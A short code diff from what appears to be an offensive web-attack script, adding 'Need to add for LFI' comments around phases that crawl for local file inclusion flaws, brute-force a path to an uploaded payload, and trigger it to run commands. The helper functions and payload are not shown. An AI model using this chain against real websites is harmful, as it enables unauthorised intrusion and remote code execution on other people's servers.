@@ -57,6 +57,7 @@ def main():
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
+    # Need to add for LFI
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
@@ -90,6 +91,7 @@ def main():
     # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
+    # Need to add for LFI
     # --- LFI Brute Force Phase ---
     lfi_found_url = None
     for target in lfi_confirmed_targets:
@@ -97,7 +99,8 @@ def main():
         lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, session, COOKIE)
         if lfi_found_url:
             break
-
+    
+    # Need to add for LFI
     # --- Trigger Payload Phase ---
     if lfi_found_url:
         command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
